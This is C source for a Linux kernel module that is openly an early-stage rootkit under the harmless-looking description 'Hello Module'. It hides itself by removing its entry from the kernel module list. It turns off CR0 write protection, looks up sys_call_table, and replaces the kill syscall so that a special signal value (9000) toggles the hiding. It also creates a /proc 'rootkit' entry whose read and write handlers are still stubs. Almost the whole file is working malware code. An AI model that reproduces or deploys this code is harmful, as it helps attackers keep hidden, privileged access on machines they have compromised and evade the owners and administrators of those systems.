#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/random.h>
#include <linux/proc_fs.h>

// Static variables

static u8 module_hidden = 0;

static struct list_head *module_list;

static struct proc_dir_entry *proc_rootkit;

// Module hiding

void module_hide(void)
{
    if (module_hidden)
        return;
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

void module_unhide(void)
{
    if (!module_hidden)
        return;
    list_add(&THIS_MODULE->list, module_list);
    module_hidden = 0;
}

// https://stackoverflow.com/a/60564037
static inline void force_write_cr0(unsigned long cr0)
{
    asm volatile("mov %0, %%cr0"
                 : "+r"(cr0), "+m"(__force_order));
}

static inline void disable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    force_write_cr0(cr0);
}

static inline void enable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    force_write_cr0(cr0);
}

static unsigned long *syscall_table;

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
static sys_call_ptr_t original_kill;

asmlinkage long hacked_kill(const struct pt_regs *pt_regs)
{
    // pid_t pid = (pid_t)pt_regs->di;
    int sig = (int)pt_regs->si;

    switch (sig)
    {
    case 9000:
        if (module_hidden)
            module_unhide();
        else
            module_hide();
        break;
    default:
        return original_kill(pt_regs);
        break;
    }
    return 0;
}

// Proc file interface

static ssize_t rk_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos)
{
    pr_info("read handler\n");
    return 0;
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos)
{
    pr_info("write handler\n");
    return -1;
}

static const struct file_operations proc_rootkit_fops = {
    .read = rk_proc_read,
    .write = rk_proc_write,
};

static int proc_init(void)
{
    proc_rootkit = proc_create("rootkit", S_IRUGO | S_IWUSR, NULL, &proc_rootkit_fops);
    if (!proc_rootkit)
        return -1;
    return 0;
}

static void proc_clean(void)
{
    if (proc_rootkit != NULL)
    {
        proc_remove(proc_rootkit);
        proc_rootkit = NULL;
    }
}

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init())
    {
        proc_clean();
        return 1;
    }

    module_hide();

    syscall_table = find_syscall_table();
    pr_info("Found syscall_table at %lx\n", *syscall_table);

    original_kill = (sys_call_ptr_t)syscall_table[__NR_kill];

    disable_write_protect();

    syscall_table[__NR_kill] = (unsigned long)hacked_kill;

    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();

    disable_write_protect();

    syscall_table[__NR_kill] = (unsigned long)original_kill;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}

module_init(lkm_rootkit_init);
module_exit(lmk_rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Thomas");
MODULE_DESCRIPTION("Hello Module");
MODULE_VERSION("0.0.1");